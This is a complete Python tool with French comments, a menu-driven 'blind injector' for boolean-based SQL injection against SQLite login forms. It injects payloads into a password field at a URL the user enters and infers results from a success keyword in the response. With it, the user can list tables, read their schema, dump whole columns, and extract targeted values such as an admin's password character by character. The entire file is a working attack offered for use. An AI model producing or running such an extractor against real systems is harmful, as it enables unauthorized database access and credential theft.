import requests
import string
import sys

# --- CONFIGURATION GLOBALE ---
# Alphabet large pour couvrir les mots de passe complexes et la syntaxe SQL
ALPHABET = string.ascii_letters + string.digits + "_-.,:;@#$%&!?'() "
TARGET_URL = ""
SUCCESS_STR = ""

# --- MOTEUR D'INJECTION ---

def get_boolean_response(payload):
    """ Envoie l'injection et retourne True/False selon la réponse """
    # L'injection : on ferme la string précédente avec n' et on commente la fin
    injection = f"n' OR {payload} --"
    
    data = {
        'username': 'admin',
        'password': injection,
        'login': 'Login'
    }

    try:
        r = requests.post(TARGET_URL, data=data)
        # Si la chaîne de succès est présente, la condition SQL est VRAIE
        return SUCCESS_STR in r.text
    except Exception as e:
        print(f"\n[!] Erreur réseau : {e}")
        sys.exit(1)

def get_length(sql_query, description="l'élément"):
    """ Trouve la longueur du résultat d'une requête SQL """
    print(f"[*] Calcul de la taille de {description}...", end='', flush=True)
    for i in range(0, 150): # Limite arbitraire à 150 chars
        payload = f"length(({sql_query})) = {i}"
        if get_boolean_response(payload):
            print(f" {i} caractères.")
            return i
        if i % 10 == 0: print(".", end='', flush=True)
    
    print("\n[-] Taille non trouvée (ou > 150).")
    return 0

def extract_string(sql_query, length):
    """ Extrait une chaîne caractère par caractère """
    found_data = ""
    for position in range(1, length + 1):
        char_found = False
        for char in ALPHABET:
            # hex() permet de comparer les valeurs hexa, évitant les erreurs de syntaxe avec les quotes
            payload = f"hex(substr(({sql_query}), {position}, 1)) = hex('{char}')"
            
            if get_boolean_response(payload):
                found_data += char
                sys.stdout.write(char) # Affiche le caractère trouvé en direct
                sys.stdout.flush()
                char_found = True
                break
        
        if not char_found:
            found_data += "?"
            sys.stdout.write("?")
            sys.stdout.flush()
            
    return found_data

# --- FONCTIONS DU DASHBOARD ---

def option_1_tables():
    print("\n--- [1] LISTE DES TABLES ---")
    # 1. Compter les tables
    nb_tables = 0
    for i in range(1, 10):
        if get_boolean_response(f"(SELECT count(tbl_name) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%') = {i}"):
            nb_tables = i
            break
    
    if nb_tables == 0:
        print("[-] Aucune table trouvée.")
        return

    print(f"[+] {nb_tables} table(s) détectée(s).")
    
    # 2. Récupérer les noms
    for i in range(nb_tables):
        print(f"\nTable {i+1}: ", end='')
        query = f"SELECT tbl_name FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' LIMIT 1 OFFSET {i}"
        length = get_length(query, "nom de la table")
        if length > 0:
            print(f"  > Nom : ", end='')
            extract_string(query, length)
            print("") # Retour ligne

def option_2_columns():
    print("\n--- [2] TROUVER LES COLONNES ---")
    table = input("Nom de la table à analyser : ").strip()
    if not table: return

    # En SQLite, on lit le CREATE TABLE dans la colonne 'sql'
    query = f"SELECT sql FROM sqlite_master WHERE type='table' AND tbl_name='{table}'"
    
    length = get_length(query, "définition SQL")
    if length > 0:
        print(f"[+] Extraction de la structure de '{table}' :")
        print("  > ", end='')
        definition = extract_string(query, length)
        print(f"\n\n[INFO] Regarde le texte ci-dessus, les colonnes sont entre parenthèses.")

def option_3_dump_column():
    print("\n--- [3] DUMP D'UNE COLONNE ---")
    table = input("Table : ").strip()
    col = input("Colonne à extraire : ").strip()
    if not table or not col: return

    # 1. Compter le nombre d'entrées
    print(f"[*] Comptage des lignes dans {table}...")
    nb_rows = 0
    for i in range(0, 50): # On teste jusqu'à 50 lignes
        if get_boolean_response(f"(SELECT count(*) FROM {table}) = {i}"):
            nb_rows = i
            break
    print(f"[+] {nb_rows} ligne(s) trouvée(s).")

    # 2. Extraire chaque ligne
    for i in range(nb_rows):
        print(f"\n[Ligne {i+1}] ", end='')
        query = f"SELECT {col} FROM {table} LIMIT 1 OFFSET {i}"
        length = get_length(query, "valeur")
        if length > 0:
            print("  > Valeur : ", end='')
            extract_string(query, length)
            print("")

def option_4_specific_value():
    print("\n--- [4] RECHERCHE CIBLÉE (WHERE) ---")
    print("Exemple: Je veux le 'password' de la table 'users' où 'username' est 'admin'")
    
    table = input("Table : ").strip()
    target_col = input("Colonne à récupérer (ex: password) : ").strip()
    where_col = input("Colonne condition (ex: username) : ").strip()
    where_val = input("Valeur condition (ex: admin) : ").strip()
    
    if not table or not target_col: return

    # Query : SELECT password FROM users WHERE username = 'admin'
    query = f"SELECT {target_col} FROM {table} WHERE {where_col} = '{where_val}'"
    
    print(f"[*] Recherche de la valeur...")
    length = get_length(query, "cible")
    
    if length > 0:
        print(f"[+] Résultat : ", end='')
        extract_string(query, length)
        print("")
    else:
        print("[-] Rien trouvé (ou condition fausse).")

# --- MAIN LOOP ---

if __name__ == "__main__":
    print("=== SQLITE BLIND INJECTOR DASHBOARD ===")
    TARGET_URL = input("URL complète : ").strip()
    SUCCESS_STR = input("Condition de succès (mot clé) : ").strip()

    while True:
        print("\n" + "="*40)
        print(" MENU PRINCIPAL")
        print("="*40)
        print(" 1. Lister les Tables (Count + Names)")
        print(" 2. Voir les Colonnes d'une Table")
        print(" 3. Dumper tout le contenu d'une colonne")
        print(" 4. Chercher une valeur précise (WHERE X=Y)")
        print(" 9. Quitter")
        
        choice = input("\nTon choix > ")
        
        if choice == '1':
            option_1_tables()
        elif choice == '2':
            option_2_columns()
        elif choice == '3':
            option_3_dump_column()
        elif choice == '4':
            option_4_specific_value()
        elif choice == '9':
            print("Bye !")
            break
        else:
            print("Choix invalide.")